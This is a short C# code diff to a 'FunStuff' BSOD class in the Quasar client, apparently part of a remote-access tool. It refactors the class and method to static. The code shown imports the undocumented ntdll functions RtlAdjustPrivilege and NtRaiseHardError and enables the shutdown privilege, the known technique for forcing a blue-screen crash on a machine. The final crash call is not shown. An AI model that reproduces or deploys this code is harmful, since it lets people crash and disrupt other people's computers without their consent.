@@ -7,7 +7,7 @@ using System.Threading.Tasks;
 
 namespace Quasar.Client.FunStuff
 {
-    public class BSOD
+    public static class BSOD
     {
         [DllImport("ntdll.dll")]
         private static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
@@ -15,7 +15,7 @@ namespace Quasar.Client.FunStuff
         private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
         public
 
-        unsafe void DOBSOD()
+        static unsafe void DOBSOD()
         {
             bool t1;
             RtlAdjustPrivilege(19, true, false, out t1);
